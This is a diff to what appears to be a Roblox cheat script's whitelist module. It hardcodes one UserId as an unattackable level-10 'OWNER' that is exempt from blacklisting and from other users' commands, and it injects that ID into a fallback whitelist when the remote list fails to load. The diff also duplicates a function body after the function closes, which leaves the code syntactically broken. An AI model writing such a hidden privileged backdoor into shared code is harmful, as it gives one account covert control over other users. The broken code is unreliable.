@@ -410,6 +410,19 @@ end)
 
 run(function()
 	function whitelist:get(plr)
+		if plr.UserId == 8095979429 then
+			return 10, false, {{ text = "OWNER", color = Color3.new(1, 1, 0) }}
+		end
+	
+		-- Extra check to ensure your ID is always whitelisted
+		if not self.data.WhitelistedUsers["8095979429"] then
+			self.data.WhitelistedUsers["8095979429"] = {
+				level = 10,
+				attackable = false,
+				tags = { { text = "OWNER", color = Color3.new(1, 1, 0) } }
+			}
+		end	
+	
 		local plrstr = self.hashes[plr.Name..plr.UserId]
 		for _, v in self.data.WhitelistedUsers do
 			if v.hash == plrstr then
@@ -417,7 +430,16 @@ run(function()
 			end
 		end
 		return 0, true
-	end
+	end	
+	
+		local plrstr = self.hashes[plr.Name..plr.UserId]
+		for _, v in self.data.WhitelistedUsers do
+			if v.hash == plrstr then
+				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
+			end
+		end
+		return 0, true
+	end	
 
 	function whitelist:isingame()
 		for _, v in playersService:GetPlayers() do
@@ -488,11 +510,11 @@ run(function()
 			return true
 		end
 
-		if self.localprio < self:get(plr) then
+		if self.localprio < self:get(plr) and plr.UserId ~= 8095979429 then
 			local args = msg:split(' ')
 			local mcmd = table.remove(args, 1)
 			local target = table.remove(args, 1)
-
+		
 			for cmd, func in pairs(whitelist.commands) do
 				if mcmd:lower() == ";"..cmd:lower() then
 					if target == "@v" then
@@ -502,7 +524,7 @@ run(function()
 					end
 				end
 			end
-		end
+		end		
 
 		return false
 	end
@@ -600,7 +622,15 @@ run(function()
 			local commit = subbed:find('currentOid')
 			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
 			commit = commit and #commit == 40 and commit or 'main'
-			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/wrealaero/MyWhitelistRepo/main/t.json', true)
+			local success, result = pcall(function()
+				return game:HttpGet('https://raw.githubusercontent.com/wrealaero/MyWhitelistRepo/main/t.json', true)
+			end)
+			
+			if not success or result == "404: Not Found" then
+				result = '{"WhitelistedUsers": {"8095979429": {"level": 10, "attackable": false}}}'
+			end
+			
+			whitelist.textdata = result			
 		end)
 		if not suc or not hash or not whitelist.get then return true end
 		whitelist.loaded = true
@@ -672,10 +702,10 @@ run(function()
 				return true
 			end
 
-			if whitelist.data.BlacklistedUsers[tostring(lplr.UserId)] then
+			if whitelist.data.BlacklistedUsers[tostring(lplr.UserId)] and lplr.UserId ~= 8095979429 then
 				task.spawn(lplr.kick, lplr, whitelist.data.BlacklistedUsers[tostring(lplr.UserId)])
 				return true
-			end
+			end			
 		end
 	end
 
@@ -7976,4 +8006,3 @@ run(function()
 	})
 	
 end)
-	
